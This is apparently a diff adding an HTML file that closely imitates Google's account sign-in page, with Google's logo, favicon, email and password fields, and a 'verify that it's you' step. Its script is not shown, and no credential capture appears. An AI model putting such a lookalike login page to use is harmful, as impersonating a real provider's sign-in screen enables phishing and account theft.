@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sign in - Google accounts</title>
+        <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+        <link rel="stylesheet" href="style.css">
+    </head>
+
+    <body>
+        <main>
+            <form>
+                <img id="google"
+                    src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+                    alt="Google">
+                <br>
+                <h2 id="heading" class="google-text-color">Sign in</h2>
+                <p id="after-signin" class="google-text-color">Use your Google Account</p>
+                <h2 id="user-heading" class="google-text-color hide">Welcome</h2>
+                <p id="user-email" class="hide google-text-color"></p>
+                <div id="email-wrapper" class="input-wrapper">
+                    <input type="email" id="email" name="email" class="input-box" required autofocus>
+                    <label id="email-label" for="email">Email or phone</label>
+                </div>
+                <p id="verify-text" class="hide google-text-color">To continue, first verify that it's you</p>
+                <div id="password-wrapper" class="input-wrapper hide">
+                    <input type="password" name="password" id="password" class="input-box" required autofocus>
+                    <label id="password-label" for="password">Password</label>
+                </div>
+                <span id="forgot-email-text">Forgot email?</span>
+                <div id="show-box" class="hide">
+                    <input type="checkbox" id="check-box">
+                    <p id="show-password" class="google-text-color">Show password</p>
+                </div>
+                <p id="device-text">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span>
+                </p>
+                <div id="last-box">
+                    <span id="create-acc">Create account</span>
+                    <span id="forgot-password-text" class="hide">Forgot password?</span>
+                    <button id="next-btn" class="next-button">Next</button>
+                    <button id="after-btn" class="next-button hide">Next</button>
+                </div>
+            </form>
+        </main>
+
+
+        <footer>
+            <select id="lang">
+                <option value="English">English</option>
+                <option value="Malayalam">Malayalam</option>
+                <option value="Hindi">Hindi</option>
+                <option value="Spanish">Spanish</option>
+                <option value="Portugease">Portugease</option>
+                <option value="Arabic">Arabic</option>
+            </select>
+            <ul>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Help</a></li>
+            </ul>
+        </footer>
+
+        <script src="script.js"></script>
+    </body>
+
+</html>
